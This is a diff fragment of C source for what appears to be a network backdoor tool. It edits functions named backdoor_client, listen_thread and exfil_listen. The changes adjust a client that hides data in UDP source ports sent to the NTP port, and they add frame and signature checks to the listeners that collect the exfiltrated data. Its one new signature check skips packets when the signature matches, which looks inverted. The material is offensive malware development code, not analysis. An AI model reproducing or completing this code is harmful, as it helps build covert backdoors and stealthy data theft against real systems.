@@ -68,8 +68,8 @@ void backdoor_client(uint32 ipaddr, int dport, int cchan, int xchan)
 				src_port += byte;
 				dst_port = PORT_NTP;
 
-				_send(ipaddr, src_port, dst_port, CHAN_UDP);
 				usleep(SLEEP_TIME);
+				_send(ipaddr, src_port, dst_port, CHAN_UDP);
 			}
 
 //			free(enc);
@@ -122,12 +122,15 @@ void *listen_thread(void *arg)
 		++ptr;
 
 		// Step 6: Decrypt and extract
-//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
 		data = buf + buf_len;
 		memcpy(data, ptr, 1);
-//		free(dec);
-
 		buf_len += 1;
+
+		if (buf_len % FRAM_SZ != 0) // Check for frame
+			continue;
+
+		//		dec = decrypt(SEKRET, ptr, FRAM_SZ);
+		//		free(dec);
 
 		// Step 7: see if we have a full transmission
 		data = getTransmission(buf, &buf_len, &type);
@@ -207,6 +210,10 @@ void* exfil_listen(void *arg)
 			continue;
 
 		// Step 2: check for signature
+		if(*ptr == SIGNTR)
+			continue;
+
+		++ptr;
 
 		// Step 3: dump data into buffer
 		ptr = (char *)(packet + IP_LEN);
